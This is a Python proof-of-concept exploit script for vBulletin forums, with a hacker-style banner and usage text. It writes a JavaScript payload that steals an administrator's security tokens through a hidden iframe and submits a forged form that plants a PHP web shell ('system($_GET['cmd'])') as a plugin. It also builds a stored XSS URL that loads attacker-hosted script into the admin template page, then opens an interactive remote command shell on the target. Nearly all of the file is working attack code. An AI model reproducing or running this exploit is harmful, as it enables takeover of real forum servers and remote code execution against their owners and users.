import requests
import sys 
import time

if len(sys.argv) < 2:
    print("""
██████████████████████████████████████████████████████████████████████████████████
█░░░░░░██░░░░░░█░░░░░░░░░░░░░░███░░░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█
█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░███░░░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█████░░▄▀▄▀░░▄▀▄▀░░███░░▄▀░░█████████░░▄▀░░█████████
█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░░░███░░░░▄▀▄▀▄▀░░░░███░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█
█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░█████░░▄▀▄▀▄▀░░█████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░░░▄▀▄▀▄▀░░░░███░░░░░░░░░░▄▀░░█░░░░░░░░░░▄▀░░█
█░░▄▀▄▀░░▄▀▄▀░░█░░▄▀░░████░░▄▀░░███░░▄▀▄▀░░▄▀▄▀░░███████████░░▄▀░░█████████░░▄▀░░█
█░░░░▄▀▄▀▄▀░░░░█░░▄▀░░░░░░░░▄▀░░█░░░░▄▀░░██░░▄▀░░░░█░░░░░░░░░░▄▀░░█░░░░░░░░░░▄▀░░█
███░░░░▄▀░░░░███░░▄▀▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█████░░░░░░█████░░░░░░░░░░░░░░░░█░░░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█
██████████████████████████████████████████████████████████████████████████████████
 [+] version 3.x - 4.x - 5.x except 5.6.4
 [+] this p0c work on version 3 and 4
 [+] Or4nG.M4n | twitter@interestedz | github@or4ngm4n                 
 [+] Usage: python vbxSs.py -rce
    """)
    sys.exit(1)

    
if sys.argv[1] == "-rce":
    print("""
██████████████████████████████████████████████████████████████████████████████████
█░░░░░░██░░░░░░█░░░░░░░░░░░░░░███░░░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█
█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░███░░░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█████░░▄▀▄▀░░▄▀▄▀░░███░░▄▀░░█████████░░▄▀░░█████████
█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░░░███░░░░▄▀▄▀▄▀░░░░███░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█
█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░█████░░▄▀▄▀▄▀░░█████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░░░▄▀▄▀▄▀░░░░███░░░░░░░░░░▄▀░░█░░░░░░░░░░▄▀░░█
█░░▄▀▄▀░░▄▀▄▀░░█░░▄▀░░████░░▄▀░░███░░▄▀▄▀░░▄▀▄▀░░███████████░░▄▀░░█████████░░▄▀░░█
█░░░░▄▀▄▀▄▀░░░░█░░▄▀░░░░░░░░▄▀░░█░░░░▄▀░░██░░▄▀░░░░█░░░░░░░░░░▄▀░░█░░░░░░░░░░▄▀░░█
███░░░░▄▀░░░░███░░▄▀▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█████░░░░░░█████░░░░░░░░░░░░░░░░█░░░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█
██████████████████████████████████████████████████████████████████████████████████
 [+] version 3.x - 4.x - 5.x except 5.6.4
 [+] this p0c work on version 3 and 4
 [+] Or4nG.M4n | twitter@interestedz | github@or4ngm4n                 
 [+] Usage: python vbxSs.py -rce
    """)
    vurl = input("Target URL :")
    jcode = """document.writeln('<iframe id="iframe" src=\""""+ vurl +"""/admincp/plugin.php?do=edit&pluginid=1" width="0" height="0" onload="read()"></iframe>');
    function read()
{
 var securitytoken = document.getElementById("iframe").contentDocument.forms[0].securitytoken.value;
 var adminhash = document.getElementById("iframe").contentDocument.forms[0].adminhash.value;
 document.writeln('<form width="0" height="0" method="post" name="cpform" action=\""""+ vurl +"""/admincp/plugin.php?do=update">');
 document.writeln('<input type="hidden" name="do" id="do" value="update"/>');
 document.writeln('<input type="hidden" name="securitytoken" value="' + securitytoken + '" /><br />');
 document.writeln('<input type="hidden" name="adminhash" value="' + adminhash + '" />');
 document.writeln('<select name="product" id="sel_product_1" tabindex="1" class="bginput">');
 document.writeln('<option value="vbulletin" selected="selected">vBulletin</option></select></div>');
 document.writeln('<select name="hookname" id="sel_hookname_2" tabindex="1" class="bginput">');
 document.writeln('<option value="ajax_complete">ajax_complete</option></select>');
 document.writeln('<input type="text" class="bginput" name="title" id="it_title_3" value="vbulletin" size="60" dir="ltr" tabindex="1" />');
 document.writeln('<input type="text" class="bginput" name="executionorder" id="it_executionorder_4" value="5" size="10" dir="ltr" tabindex="1" />');
 document.writeln('<textarea name="phpcode" id="ta_phpcode_5" class="code" rows="10" cols="45" style="width:100%" tabindex="1">if(isset($_GET["cmd"])){echo "<h1>cmd</h1><pre>"; system($_GET["cmd"]);exit;}</textarea>');
 document.writeln('<input type="radio" name="active" id="rb_1_active_6" value="1" tabindex="1" checked="checked" />Yes</label>');
 document.writeln('<input type="hidden" name="pluginid" value="34" /><script>document.forms["cpform"].submit();</script></form>');
} """
    f = open("xss.js", "w")
    f.write(jcode)
    f.close()
    jurl = input("JS URL :")
    jss = vurl + "/admincp/template.php?s=&do=add&dostyleid=1&title=<script src="+ jurl +"></script>&group=&searchstring=&expandset=1"
    print("Generated Done : " + jss)
    print("waiting for cmd shell")
def get_cmd():
    while True:
        cmd = input("-#")
        if cmd == "exit":
            break
        url = vurl + "/ajax.php?cmd="
        response = requests.get(url + cmd)
        print(response.content.decode())    
        time.sleep(2)

response = None
while response is None or "cmd" not in response.text:
    response = requests.get(vurl + "/ajax.php?cmd")
    if "cmd" in response.text:
        print("[+] injected Done to close connect type exit or ctrl+c")
        get_cmd()
    else:
        time.sleep(0)